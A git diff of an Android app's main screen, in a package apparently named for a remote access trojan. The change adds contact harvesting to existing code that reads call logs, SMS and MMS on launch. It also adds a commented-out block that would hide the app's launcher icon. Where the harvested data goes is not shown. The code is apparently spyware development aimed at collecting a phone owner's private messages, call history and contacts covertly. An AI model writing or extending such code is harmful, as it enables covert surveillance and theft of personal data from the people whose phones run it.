@@ -1,11 +1,13 @@
 package com.score.rat;
 
+import android.content.pm.PackageManager;
 import android.support.v7.app.ActionBarActivity;
 import android.os.Bundle;
 import android.view.Menu;
 import android.view.MenuItem;
 import com.score.rat.Library.CallLogLister;
 import com.score.rat.Library.SMSLister;
+import com.score.rat.Library.ContactLister;
 
 
 public class MainActivity extends ActionBarActivity {
@@ -14,9 +16,16 @@ public class MainActivity extends ActionBarActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+//        PackageManager p = getPackageManager();
+//        p.setComponentEnabledSetting(getComponentName(),
+//                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                PackageManager.DONT_KILL_APP);
+
         CallLogLister.ListCalls(this);
         SMSLister.listSms(this);
         SMSLister.listMms(this);
+        ContactLister.listContacts(this);
     }
 
 
